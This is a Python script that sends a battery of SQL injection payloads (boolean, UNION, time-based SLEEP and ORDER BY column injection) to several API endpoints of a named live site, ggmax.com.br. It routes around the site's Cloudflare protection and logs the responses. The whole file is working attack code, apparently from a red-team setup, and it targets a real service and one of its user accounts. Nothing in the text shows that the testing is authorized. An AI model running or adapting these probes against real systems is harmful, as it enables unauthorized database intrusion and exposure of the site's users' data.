#!/usr/bin/env python3
"""SQLi tests on ggmax.com.br legacy API (CF-bypassed via curl_cffi)."""
import sys, time, json
sys.path.insert(0, '/home/ubuntu/red-team-operator/ggmax.com.br/enum/api')
from api import req

results = []

def timed(label, path, params=None, method='GET', body=None, ct=None, extra=None):
    t = time.time()
    r = req(path, method, body, ct, extra_headers=extra, params=params)
    dt = time.time() - t
    try:
        d = json.loads(r.get('body',''))
        n = len(d.get('data',[])) if 'data' in d else -1
        total = d.get('total', d.get('hasMore','?'))
    except:
        n = -1; total = '?'
    snip = r.get('body','')[:120].replace('\n',' ')
    line = f'{label:50s} {r["status"]} {r["size"]:>7}B {dt:5.2f}s n={n} total={total} | {snip}'
    print(line)
    results.append({'label':label, 'status':r.get('status'), 'size':r.get('size'), 'dt':round(dt,2), 'n':n, 'total':total, 'body':r.get('body','')[:300]})

# === /api/search q param ===
timed('BASE q=test', '/api/search', {'q':'test'})
timed("q=test'", '/api/search', {'q':"test'"})
timed('q=test"', '/api/search', {'q':'test"'})
timed("q=test' --", '/api/search', {'q':"test' --"})
timed("q=test' OR '1'='1", '/api/search', {'q':"test' OR '1'='1"})
timed("q=test' OR 1=1", '/api/search', {'q':"test' OR 1=1"})
timed("q=test' UNION SELECT 1--", '/api/search', {'q':"test' UNION SELECT 1--"})
timed("q=test' SLEEP(3)--", '/api/search', {'q':"test' SLEEP(3)--"})
timed("q=test' AND SLEEP(3)--", '/api/search', {'q':"test' AND SLEEP(3)--"})
timed('q=%', '/api/search', {'q':'%'})
timed('q=test\'\'', '/api/search', {'q':"test''"})
timed("q=\\\\' OR 1=1--", '/api/search', {'q':"\\' OR 1=1--"})

# === /api/search order_by / sort / orderby (column injection) ===
timed('order_by=id', '/api/search', {'q':'test','order_by':'id'})
timed('order_by=id,', '/api/search', {'q':'test','order_by':'id,'})
timed('order_by=id ASC', '/api/search', {'q':'test','order_by':'id ASC'})
timed('order_by=id DESC', '/api/search', {'q':'test','order_by':'id DESC'})
timed('order_by=id,(SELECT 1)', '/api/search', {'q':'test','order_by':'id,(SELECT 1)'})
timed('order_by=id--', '/api/search', {'q':'test','order_by':'id--'})
timed('order_by=(SELECT 1)', '/api/search', {'q':'test','order_by':'(SELECT 1)'})
timed('order_by=title', '/api/search', {'q':'test','order_by':'title'})
timed('order_by=nonexistent', '/api/search', {'q':'test','order_by':'zzznonexistent'})
timed('sort=id', '/api/search', {'q':'test','sort':'id'})
timed('sort=(SELECT 1)', '/api/search', {'q':'test','sort':'(SELECT 1)'})
timed('sort=id,xx', '/api/search', {'q':'test','sort':'id,xx'})
timed('orderby=id', '/api/search', {'q':'test','orderby':'id'})
timed('orderby=(SELECT 1)', '/api/search', {'q':'test','orderby':'(SELECT 1)'})

# === /api/accounts/search q param (F-W7) ===
timed('BASE q=paturismurfs', '/api/accounts/search', {'q':'paturismurfs'})
timed("q=paturismurfs'", '/api/accounts/search', {'q':"paturismurfs'"})
timed("q=paturismurfs' --", '/api/accounts/search', {'q':"paturismurfs' --"})
timed("q=paturismurfs' OR '1'='1", '/api/accounts/search', {'q':"paturismurfs' OR '1'='1"})
timed("q=paturismurfs' SLEEP(3)--", '/api/accounts/search', {'q':"paturismurfs' SLEEP(3)--"})
timed("q=paturismurfs' UNION SELECT 1--", '/api/accounts/search', {'q':"paturismurfs' UNION SELECT 1--"})
timed("q=pat' OR 1=1 --", '/api/accounts/search', {'q':"pat' OR 1=1 --"})
timed("q=pat%\" OR 1=1 --", '/api/accounts/search', {'q':"pat%' OR 1=1 --"})
timed("q=pat%' SLEEP(3)--", '/api/accounts/search', {'q':"pat%' SLEEP(3)--"})

# === /api/users/v2/inspect/{user}/order-reviews (user param) ===
timed('BASE user=paturismurfs', '/api/users/v2/inspect/paturismurfs/order-reviews')
timed("user=paturismurfs'", '/api/users/v2/inspect/paturismurfs\'/order-reviews')
timed("user=paturismurfs' OR '1'='1", '/api/users/v2/inspect/paturismurfs\'%20OR%20\'1\'=\'1/order-reviews')
timed("user=paturismurfs' --", '/api/users/v2/inspect/paturismurfs\'%20--/order-reviews')
timed("user=test' OR 1=1", '/api/users/v2/inspect/test\'%20OR%201=1/order-reviews')
timed('user=1', '/api/users/v2/inspect/1/order-reviews')
timed('user=0', '/api/users/v2/inspect/0/order-reviews')
timed('user=-1', '/api/users/v2/inspect/-1/order-reviews')

# Save results
with open('/tmp/sqli_results.json', 'w') as fh:
    json.dump(results, fh, ensure_ascii=False, indent=2)
print('\n[+] Results saved to /tmp/sqli_results.json')
